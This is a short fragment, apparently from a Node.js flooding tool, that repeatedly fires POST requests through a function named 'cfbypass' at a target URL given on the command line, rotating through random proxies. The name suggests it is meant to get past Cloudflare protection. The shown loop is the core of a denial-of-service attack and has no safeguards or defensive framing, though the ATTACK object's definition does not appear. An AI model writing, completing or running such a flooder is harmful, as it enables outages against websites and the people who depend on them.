...
setInterval(function() {
    ATTACK.cfbypass('POST', process.argv[2], proxies[Math.floor(Math.random() * proxies.length)]);
});
 
console.log("POST Test has been sent to %s for %s seconds", process.argv[2], process.argv[3]);